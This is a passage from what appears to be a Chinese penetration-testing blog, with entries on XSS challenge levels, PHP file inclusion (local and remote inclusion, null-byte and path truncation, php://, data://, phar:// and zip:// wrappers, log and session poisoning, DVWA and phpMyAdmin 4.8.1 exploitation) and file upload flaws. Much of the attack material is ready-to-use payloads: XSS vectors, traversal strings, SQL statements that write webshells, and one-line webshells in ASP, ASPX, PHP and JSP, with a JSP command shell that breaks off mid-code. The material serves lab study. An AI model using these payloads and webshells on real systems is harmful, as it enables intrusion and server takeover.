&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第12关 HTTP User-Agent源码 12345678910111213141516&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 这一题和上一题类似，只是这里的漏洞点出现在了HTTP请求头的User-Agent。 使用hackbar或者BurpSuite可以很方便地改写HTTP请求头地User-Agent字段： payload 1User-Agent: &quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第13关 HTTP Cookie源码 1234567891011121314151617&lt;?phpsetcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 这里的漏洞点出现在了HTTP请求头的Cookie的user属性中。 使用hackbar或者BurpSuite可以很方便地改写HTTP请求头地Cookie字段： payload 1Cookie: user=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) // 第14关 Angular JS源码 1234567&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;?&gt; 这题考察Angular JS 的ng-include用法，具体可以参考这篇资料：AngularJS ng-include 指令 ng-include 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。 payload 1level14.php?src=&quot;level1.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&quot; 第15关 过滤空格源码 123456789&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt; 这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。 可以使用如下符号替代空格 符号 URL编码 回车(CR) %0d 换行(LF) %0a ？？？求补充 %0c payload 1level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&apos;XSS&apos;)&gt; XSS 实战应用XSS 平台搭建推荐一个经典开源的 XSS 平台： 项目地址：https://github.com/firesunCN/BlueLotus_XSSReceiver Fork 地址：https://github.com/winthorlimo/BlueLotus_XSSReceiver 无需数据库，将源码放入到网站目录下访问即可，配置记录好平台的后台登录密码： 以后再次登录手动访问 login.php 即可重新登录 后台地址：http://127.0.0.1/xss/login.php 此时别人访问 http://127.0.0.1/xss/ 也会被钓鱼记录。 第三方XSS平台https://xss8.cc/xss.php https://xss.pt/xss.php 奇技淫巧 百度百科：奇技淫巧，读音qí jì yín qiǎo，是一个成语，意思是指过于奇巧，让人着迷，却又无益的技艺与制品。奇：奇异，奇巧，有趣的。技：技术，技巧，带有技术性的。淫：过分，极端，沉迷，上瘾。 反引号代替圆括号1&lt;img src=x onerror=alert`1`&gt; location + 拆分1234&lt;img src=1 onerror=location="javascript:alert(1)"&gt;&lt;img src=1 onerror=location="javascript:alert%281%29"&gt; // URL 编码&lt;img src=1 onerror=location="javascript:"+"aler"+"t(1)"&gt; // 也可以拆分&lt;img src=1 onerror=location="javascript:"+"aler"+"t%281%29"&gt; // URL编码+拆分 svg + top12&lt;svg onload=top['alert'](1)&gt;&lt;svg onload=top['al'+'ert'](1)&gt; detail + top123&lt;details ontoggle=alert(1)&gt;&lt;/details&gt;&lt;details ontoggle=top["alert"](1)&gt;&lt;/details&gt;&lt;details open ontoggle=top["alert"](1)&gt;&lt;/details&gt; HTML &lt;details&gt;元素可创建一个挂件，仅在被切换成展开状态时，它才会显示内含的信息]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2Fnote%2F2020%2Fundefined04%2F4089de4e.html</url>
    <content type="text"><![CDATA[PHP文件包含漏洞下面是两个看上去比较啰嗦的 php 文件，运行的效果几乎是一致的： one.php 1234function welcome($name)&#123; echo "welcome to &#123;$name&#125;";&#125;welcome('UserA'); two.php 1234function welcome($name)&#123; echo "welcome to &#123;$name&#125;";&#125;welcome('UserB'); 程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用 此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。下面来改进上述的功能代码： common.php 123function welcome($name)&#123; echo "welcome to &#123;$name&#125;";&#125; one.php 12include('common.php');welcome('UserA'); two.php 12include('common.php');welcome('UserB'); 开发者希望代码更加灵活，所以很多时候会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活，导致客户端可能调用恶意文件，造成文件包含漏洞。 1234error_reporting(0);$file = $_GET['file'];include($file); 几乎在所有的脚本语言中都会提供文件包含的功能，但文件包含漏洞在 PHP 中居多，而在 JSP、ASP、ASP.NET 程序中却非常少，甚至没有包含漏洞的存在。 这与程序开发人员的水平无关，而问题在于语言设计的弊端。 文件包含漏洞产生的原因是在引入文件时，由于传入的文件名没有经过合理的校验或者校验被绕过，从而操作了预想之外的文件，因此导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就会形成本地文件包含漏洞。 漏洞成因文件包含（File Inclusion）可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。 PHP1include(), include_once(), require(), require_once(), fopen(), readfile() 在互联网的安全历史中，PHP的文件包含漏洞已经臭名昭著了，因为黑客们在各种各样的PHP应用中挖出了数不胜数的文件包含漏洞，且后果都非常严重。 文件包含是PHP的一种常见用法，这四个函数都可以进行文件包含，但作用却不一样，其区别如下: require 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本; include 找不到被包含的文件时只会产生警告(E_WARNING)，脚本将继续执行; include_once:此语句和 include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含，以避免函数重定义，变量重新赋值等问题; require_once:此行语句和 require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含，以避免函数重定义，变量重新赋值等问题。 使用这 4 种函数包含一个新的文件时，只要文件内容符合 PHP 语法规范，任何扩展名都可以被 PHP 解析。当包含非 PHP 语法规范的源文件时，将会暴露其源代码，造成文件读取漏洞。 要想成功利用文件包含漏洞，需要满足下面两个条件： include() 等函数通过动态变量的方式引入需要包含的文件 攻击者能够控制该动态变量 PHP的文件包含漏洞分为两大种：本地文件包含 (Local File Include)和 远程文件包含(Remote File Include) 两种包含漏洞的检测方法和防御方法各不相同， 本地文件包含漏洞是加载服务器本地的文件 远程文件包含漏洞是加载一个远程的资源 JSPJSP 包含分两种方式:静态包含和动态包含。 1.静态包含 1&lt;%@ include file="page.txt"%&gt; 为 JSP 中的静态包含语句，静态包含语句先进行包含，再做处理操作。下面看一段简单的代码来观察 JSP 静态包含的特性。 a.txt 文件内容如下: 1234&lt;%@ page language="java" import="java.util.*" pageEncoding="gbk"%&gt;&lt;% out.println("this is page a.txt");%&gt; 尝试用 index.jsp 来包含 a.txt，代码如下: 1&lt;%@ include file="a.txt" %&gt; 用浏览器访问 index.jsp，此时 a.txt 文件会被当作 JSP 文件解析： 在前面曾经说过，文件包含漏洞利用最主要的是可以控制被包含的文件， 但是 JSP 语法规定，include 指令为静态包含，只允许包含一个已经存在于服务器中的文件，而不能使用变量来控制包含某个文件。这就意味着使用 include 指令将不存在文件包含漏洞。 2.动态包含 1&lt;jsp:include page="page.txt" /&gt; 为动态包含语句。动态包含与静态包含恰恰相反，在运行时， 首先会处理被包含页面，然后再包含，而且可以包含一个动态页面(变量)。 1234&lt;% String pages = request.getParameter("page");%&gt;&lt;jsp:include page="&lt;%=pages%&gt;" &gt;&lt;/jsp:include&gt; 尝试通过 pages 参数来再次包含 a.txt 1a.jsp?page=a.txt 当&lt;jsp:include/&gt;标签在包含一个非 JSP 文件扩展名时，即使其内容符合 JSP 语 法规范，也会读取其源代码，而不会解析其 JSP 代码： 那么此时新建一个文件： b.jsp 1234&lt;%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%&gt;&lt;% out.println("this is page b.jsp");%&gt; 那么来尝试包含 b.jsp 试试看： 这就意味着 JSP 所包含的页面即使被攻击者控制，攻击者得到的信息也是有限的。(攻击者一般都会包含一些 Web 容器的配置文件， 比如 Tomcat 的 user.xml。来获取敏感信息) 由于语言设计的差异，相对来说，JSP 比 PHP 拥有更高的安全性。PHP 从某些方面而言，它的许多优点正是它的缺点。 本地文件包含能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion，简称 LFI)。 大多出现在模块加载、模板加载和cache调用这些地方，渗透的时候利用起来并不鸡肋，本地文件包含有多种利用方式，比如上传一个允许上传的文件格式的文件再包含来执行代码，包含 PHP 上传的临时文件，在请求 URL 或者 UA 里面加入要执行的代码，WebServer 记录到日志后再包含WebServer的日志。 123456&lt;?php error_reporting(0); $file = $_GET['file']; include($file);?&gt; 引入同目录下的一个文件时： 1index.php?file=payload.txt 当 payload.txt 的内容为： 1&lt;?php phpinfo(); ?&gt; 访问漏洞的 URL，会发现phpinfo()函数代码执行了，这个页面被当作 PHP 来解析了。 也可以传入自定义的路径信息： 123?file=../../../../../../../../windows/win.ini?file=C:\Windows\win.ini ../ 越多越好，宁缺毋滥 远程文件包含PHP 不仅可以对本地文件进行包含，还可以对远程文件进行包含(Remote File Inclusion，简称 RFI)。 如果要使用远程包含功能，首先需要确定 PHP 是否已经开启远程包含功能选项(PHP 默认关闭远程包含功能)。开启 远程包含功能需要在 php.ini 配置文件中修改，修改后需要重启 Web 容器服务使其生效，选项如下: allow_url_fopen allow_url_include (PHP 5.2 之后默认为 Off) 这样之前演示的本地问价包含，这里将路径改为 URL 的形式去包含看看： 1http://192.168.31.89/fi/index.php?file=http://192.168.31.89/fi/payload.txt 远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循 PHP 语法规范，PHP 解析器，就会对其解析。 尝试包含 其他远程文件测试看看： 1http://192.168.31.89/fi/index.php?file=http://www.baidu.com/robots.txt 一句话工作原理GET 型123456&lt;?php @eval($_GET['pass']);?&gt;shell.php?pass=phpinfo();shell.php?pass=system('dir');shell.php?pass=system('ipconfig'); POST 型123&lt;?php @eval($_POST['pass']);?&gt; 和 GET 型类似，只是传参的方式变了： REQUEST 型123&lt;?php @eval($_REQUEST['pass']);?&gt; 可以接受URL和表单传参 客户端中国蚁剑项目地址：https://github.com/AntSwordProject/antSword 文档详情：https://doc.u0u.us/zh-hans/ 中国蚁剑可以设置 Burpsuite 的代理，这样可以很方便地查看中国蚁剑的实际的流量情况，可以加深对一句话木马的理解以及后面进阶的 Bypass 操作： 冰蝎项目地址：https://github.com/rebeyond/Behinder 中国菜刀经典的管理工具，但是由于可能存在后门的可能，不建议大家使用中国菜刀。 网友项目地址：https://github.com/raddyfiy/caidao-official-version 文件包含之截断防护措施大多数程序猿认为 PHP 中的包含漏洞比较好修复，固定扩展名即可，代码如下: 123456&lt;?php error_reporting(0); if(isset($_GET['file']))&#123; include $_GET['file'] .".php"; &#125;?&gt; 当进行包含时，不需要传输文件扩展名，例如，想要包含 News.php 页面，只需要传入 ?file=News 即可。这样可以变相地修复包含漏洞。 复现漏洞尝试之前的 Payload 进行测试 1?file=../../../../../../../../windows/win.ini 并没成功读取到问价内容，这个时候关掉 PHP的 忽略BUG的代码，尝试看下到底发生了什么： 这个导致我们无法随心所欲地去读取系统文件信息了，因为这个文件显然是不存在的，这个时候程序猿就会想到使用字符串截断的方法来进行绕过。 %00截断截断的原理：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节(\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串 1?file=payload.txt\0 因为浏览器 URL 并不支持 \，因此通过浏览访问的时候需要通过 urlencode 进行编码，变成： 1?file=payload.txt%00 这种方法只适用于 magic_quotes_gpc = Off PHP 版本小于 5.3.4 如果为 On %00(NULL)将会被转义，从而无法正常截断。 magic_quotes_gpc 为 On 的情况会为以下预定义字符转义: 单引号(‘) 双引号(“) 反斜杠() NULL 路径长度截断条件：PHP 的老版本（PHP &lt;=5.3.4）、Windows 或 Linux Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。./表示当前路径。 1?file=payload.txt././././././././超过一定数量的./././././ 点号截断条件：PHP 的老版本（PHP &lt;=5.3.4），Windows Winodws 下目录最大长度为 256 字节，Windows 下cd ...显示的还是当前目录（点的数量不等于2时） 1?file=payload.txt........超过一定数量的........ 远程文件截断 robot.txt 禁止爬虫日志:可以看到网站隐藏的一些目录 可以通过空格、井号、问号截断绕过，不受GPC和PHP版本限制，只要能返回代码给包含函数，它就能执行： 12345678# 空格截断?file=http://192.168.31.89/fi/payload.txt%20# 问号截断?file=http://192.168.31.89/fi/payload.txt?# 井号截断?file=http://192.168.31.89/fi/payload.txt%23 PHP 伪协议PHP 带有很多内置 URL 风格的封装协议，这类协议与 fopen()、copy()、file_exists()、filesize() 等文件系统函数所提供的功能类似。 名称 含义 file:// 访问本地文件系统 http:// 访问 HTTP(s)网址 ftp:// 访问 FTP(s) URLs php:// 访问输入/输出流(I/O streams) zlib:// 压缩流 data:// 数据(RFC 2397) ssh2:// Secure Shell 2 expect:// 处理交互式的流 glob:// 查找匹配的文件路径 利用php伪协议进行远程文件包含： 访问URL：http://10.11.29.138/fi/php.php?file=php://filter/convert.base64-encode/resource=flag.php php.php : 1234&lt;?php $file = $_GET['file']; include($file);?&gt; php://filter（文件读取）获取指定文件源码，我们一般对其进行编码来读取一些 PHP 源码信息。 123?file=php://filter/read=convert.base64-encode/resource=index.php?file=php://filter/convert.base64-encode/resource=index.php?filename=php://filter/convert.iconv.utf-16le.utf-8/resource=flag.php 这里要访问php.php，所以最后改成php.php 访问 URL，得到经过 Base64 加密后的字符串: 1PD9waHANCiAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107DQogICAgaW5jbHVkZSgkZmlsZSk7DQo/Pg== php://input（写入木马）使用 php://input 可以获取POST的数据流，如果满足条件也可以直接执行 PHP 语句。 条件： allow_url_include 这可以理解成远程文件包含漏洞（RFI），即 POST 过去PHP代码，即可执行。 如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。 1&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST["pass"])?&gt;');?&gt; 此时木马就已经写入到了 index.php 的同级目录下了： 同理还可以直接命令执行： 1?file=php://input POST 数据内容如下，来执行命令： 1&lt;?php system('ipconfig');?&gt; data://伪协议类似于php://input，可以让用户来控制输入流，如果和文件包含结合的话，可以将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，导致可以执行任意 payload 条件： allow_url_fopen=On allow_url_include=On PHP &gt; 5.2 12?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 12345678# 明文&lt;?php phpinfo();?&gt;# base64 编码PD9waHAgcGhwaW5mbygpOz8+# + URL 转码PD9waHAgcGhwaW5mbygpOz8%2b 蓝帽杯文件包含思路https://yanmymickey.github.io/2020/04/17/CTFwp/Phuck2/ ?page=data:123/res 当allow_url_include=Off时 创建的是data:123文件夹下的res文件 file_get_contents在处理data:123/res时会直接处理data:去掉伪协议后再读取123文件夹下的res,而此文件夹不存在 include() 函数不认识伪协议,所以会直接包含data:123文件夹下的res phar://伪协议这个参数是就是 PHP 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。并且相对路径和绝对路径都可以使用。 条件：PHP &gt;= 5.3 文件 payload.txt，其内容为&lt;?php phpinfo();?&gt;，打包成 zip 压缩包，如下： 12?file=phar://payload.zip/payload.txt?file=phar://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip/payload.txt zip://伪协议zip 伪协议和phar协议类似，可以访问压缩包里面的文件。但是用法不一样。 条件：PHP &gt;= 5.2 12# 用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。 需要指定绝对路径 # 要注意 URL 编码 1?file=zip://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip%23payload.txt 若是使用相对路径，则会包含失败。 实战中包含技巧包含 HTTP 日志条件：知道服务器日志的存储路径，且日志文件可读。 怎么合法的往服务器写马：利用头像、SSH日志、Web日志、Sessions 常见日志位置： 1234567891011121314151617181920212223242526272829/var/log/nginx/access_log/var/log/nginx/errors_log/var/log/apache/access_log/var/log/apache/error_log/var/log/apache2/access.log/var/log/apache2/error.log/var/log/httpd/access.log/var/log/httpd/error.log/var/www/logs/error.log/var/www/logs/access.log/apache/logs/error.log/apache/logs/access.log/usr/local/apache/logs/access.log/usr/local/apache/logs/error.log/usr/local/apache2/logs/access.log/usr/local/apache2/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/error_logC:\PhpStudy\PHPTutorial\Apache\logs\access.logC:\PhpStudy\PHPTutorial\Apache\logs\error.log 也可以读取配置文件来查找对应的日志： 123456789/etc/httpd/conf/httpd.conf/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/etc/apache2/apache2.conf# nginx -t 测试配置文件是否正确，同时也告诉了配置文件的路径/usr/local/etc/nginx/nginx.conf/etc/nginx/nginx.conf 如果可以执行命令的话，也可以手动 find 来查找配置文件信息： 12find / -name nginx.conffind / -name httpd.conf Window 2003 + IIS6.0 日志文件默认放在 123C:\WINDOWS\system32\Logfiles配置文件默认在C:\Windows\system32\inetsrv\metabase.xml IIS 7 日志文件默认在 1C:\inetpub\logs\LogFiles 配置文件默认目录 12345678910C:\Windows\System32\inetsrv\config\applicationHost.configC:\apache\logs\access.logC:\Program Files\Apache Group\Apache\logs\access.logC:\program files\wamp\apache2\logsC:\wamp\logsC:\xampp\apache\logs\error.logC:\apache\logs\error.logC:\Program Files\Apache Group\Apache\logs\error.logC:\wamp\apache2\logsC:\xampp\apache\logs\access.log 尝试将敏感信息写入到日志中： 1http://192.168.31.89/&lt;?php phpinfo();?&gt; 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用 burp 截包后修改。 然后尝试直接包含日志文件： 1http://192.168.31.89/fi/?file=C:\PhpStudy\PHPTutorial\Apache\logs\access.log 包含SSH日志SSH日志也可以用来进行包含，以为大多数情况下这个日志文件上是可读的。 默认情况下为 /var/log/auth.log 1ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@10.211.55.5 包含用户上传的文件 用户上传的文件 常用于图马，图马制作: 1copy xx.jpg/b+xxx.php/a shell.jpg b 表示二进制文件 a表示asscii码文件 临时文件、其他服务的文件 包含 session条件：session 文件路径已知，且其中内容可控。 linux 常见/etc/passwd windows常见 windows/win.ini PHP 的 session 文件的保存路径可以在 phpinfo 的 session.save_path 看到： 常见的 php-session 存放位置： 12345678C:\PhpStudy\PHPTutorial\tmp\tmp\sess_PHPSESSID/var/lib/php/sessions/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/var/lib/php5/sessions/sess_PHPSESSID/var/lib/php5/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSIDsession` 的文件名格式为 `sess_[phpsessid] 有些情况下 phpsessid 在发送的请求的 cookie 字段中也可以看到: 要包含并利用的话，需要能控制部分 sesssion 文件的内容。暂时没有通用的办法，下方是故意写一个可以控制 Session 内容的 PHP 代码： 12345678&lt;?php error_reporting(0); session_start(); $username = $_GET['username']; $_SESSION['username'] = $username; highlight_file(__FILE__);?&gt; 然后浏览器访问： 1http://x.x.x.x/FI/?username=2333 找到这个 session 文件来看看我们是否成功控制了 session 文件的内容了： 那么可以直接往 session 文件里面写 payload 然后配合文件包含： 1http://x.x.x.x/FI/?username=&lt;?php phpinfo();?&gt; DVWA 实战LOW123456&lt;?php// The page we wish to display$file = $_GET[ 'page' ];?&gt; 可以看到，服务器端对page参数没有做任何的过滤跟检查。 服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 1234..\..\..\..\..\..\..\windows/win.ini访问 C:/windows/win.ini..\../..\../..\../..\../..\../..\../windows/win.ini?page=http://127.0.0.1/FI/1/payload.txt 如果服务器对../等做一些过滤的话，可以用一些编码来进行绕过: 12345678910../%2e%2e%2f..%2f%2e%2e/%252e%252e%252f..\%2e%2e%5c..%5c%2e%2e\%252e%252e%255c medium12345678910&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Input validation$file = str_replace( array( "http://", "https://" ), "", $file );$file = str_replace( array( "../", "..\"" ), "", $file );?&gt; 可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理 使用 str_replace 函数替换为空的话，是极其不安全的，因为可以使用双写绕过替换规则： 1...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini High12345678910111213&lt;php//Thepagewewishtodisplay$file=$_GET['page'];//Inputvalidationif(!fnmatch("file*",$file)&amp;&amp;$file!="include.php")&#123; //Thisisn'tthepagewewant!echo"ERROR:Filenotfound!";exit;&#125;&gt; 可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 1file:///C:/Windows/win.ini file:///c:/windows/system32/cmd.exe 可以沙盒溢出弹出取￥机cmd Web for Pentester 靶场Example 1 常规关键代码： 123456&lt;?php require_once '../header.php'; ?&gt;&lt;?php if ($_GET["page"]) &#123; include($_GET["page"]); &#125;?&gt; 最基础的文件包含，page 变量通过 GET 方式传递值，然后直接被 include 函数包含，下面直接丢 payload: 1/fileincl/example1.php?page=/etc/passwd 尝试了一下，发现还可以进行远程文件包含： 1/fileincl/example1.php?page=http://www.baidu.com/robots.txt Example 2 截断关键代码： 12345678&lt;?php if ($_GET["page"]) &#123; $file = $_GET["page"].".php"; // simulate null byte issue $file = preg_replace('/\x00.*/',"",$file); include($file); &#125;?&gt; 虽然在 page 后面手动添加了 .php 后缀了，但是下面在正则依然是\x00.*谜一样的操作，依然是吧 00 截断以及后面的内容都替换为空，这样间接地帮助我们把 .php 给干掉了，那么就直接丢 payload 吧: 1/fileincl/example2.php?page=/etc/passwd%00 实际上如果进行远程文件包含的话，还可以使用?和#截断，#的 URL 编码就是 %23: 12/fileincl/example2.php?page=https://www.baidu.com/robots.txt?/fileincl/example2.php?page=https://www.baidu.com/robots.txt%23 phpMyAdmin 综合利用案例常用方法 直接写shell条件：MySQL的load_file()开启，知道网站的物理路径 load_file() 1234567mysql&gt; show global variables like '%secure%';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_auth | OFF || secure_file_priv | |+------------------+-------+ 物理路径 执行如下语句来写入 shell 文件： 123select '&lt;?php phpinfo(); ?&gt;' into outfile 'C:\\PhpStudy\\PHPTutorial\\WWW\\fi\\info.php';select '&lt;?php phpinfo(); ?&gt;' into outfile 'C:/PhpStudy/PHPTutorial/WWW/fi/info.php'; 开启日志写 shellMySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell 1234567mysql&gt; SHOW VARIABLES LIKE 'general%';+------------------+-----------------------------------------------+| Variable_name | Value |+------------------+-----------------------------------------------+| general_log | OFF || general_log_file | C:\PhpStudy\PHPTutorial\MySQL\data\GGD2F3.log |+------------------+-----------------------------------------------+ general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 如果可以自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell 12set global general_log = "ON";set global general_log_file='C:/PhpStudy/PHPTutorial/WWW/shell.php'; 检测是否开启了日志功能： 1234567mysql&gt; SHOW VARIABLES LIKE 'general%';+------------------+---------------------------------------+| Variable_name | Value |+------------------+---------------------------------------+| general_log | ON || general_log_file | C:/PhpStudy/PHPTutorial/WWW/shell.php |+------------------+---------------------------------------+ 因为日志会记录任何数据，这个时候直接输入：&#39;&lt;?php phpinfo();?&gt;&#39; 尽管已经报错了： 但是数据库日志文件里面已经记录对应的语句文件： 浏览器访问验证效果： 文件包含 session 利用phpMyAdmin4.8.X 版本中的本地文件包含漏洞：phpmyadmin4.8.1后台getshell。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。 123456# Windows文件包含/index.php?target=db_sql.php%253f/../../../../../../../../../../windows/win.ini# Linux文件包含/index.php?target=db_sql.php%253f/../../../../../../../../../../etc/passwd/index.php?target=db_sql.php%253f/../../../../../../../../../../etc/hosts 执行一个敏感的语句： 本次测试环境的 session 的位置是： 1C:\PhpStudy\PHPTutorial\tmp\tmp\sess_PHPSESSID 可以通过审查元素或者抓包来查看当前的 session： 查找对应的文件来看看： 然后尝试去包含这个 session 文件 1/index.php?target=db_sql.php%253f/../../../../../../../../../../PhpStudy/PHPTutorial/tmp/tmp/sess_282p45oo4a4bjb4i7d1h2hdr58coi87i 尝试更复杂的语句： 123&lt;?php system('echo ^&lt;?php eval($_POST[gg])?^&gt; &gt; gg.php')?&gt;# 手动生成木马再连&lt;?php fputs(fopen('gg.php','w'),'&lt;?php eval($_POST[gg])?&gt;');?&gt;]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2Fnote%2F2020%2Fundefined03%2F931c692.html</url>
    <content type="text"><![CDATA[文件上传漏洞文件上传漏洞简介现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如企业的 OA 系统，允许用户上传图片、视频、头像和许多其他类􏰀的文件。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应 用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。 漏洞产生原因上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤， 就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。 漏洞的危害非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门， WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。 WebShell 就是以 ASP、PHP、JSP 等网页脚本存在的一种命令执行环节，通常也叫做网页后门。攻击者在入侵了一个网站后，通常会将 WebShell 上传到网站的根目录下或者插入到正常的网页中，然后使用浏览器或者对应的 WebShell 客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。 ASP 123&lt;%eval request(&quot;x&quot;)%&gt;&lt;%execute request(&quot;x&quot;)%&gt; ASPX 1&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;x&quot;],”unsafe”);%&gt; PHP 123&lt;?php eval($_POST['x'])?&gt;&lt;?php assert($_POST['x']); ?&gt; JSP CMD WebShell 1234567891011121314&lt;% if("x".equals(request.getParameter("pwd"))) &#123; java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("&lt;pre&gt;"); while((a=in.read(b))!=-1) &#123; out.println(new String(b)); &#125; out.print("&lt;/pre&gt;"); 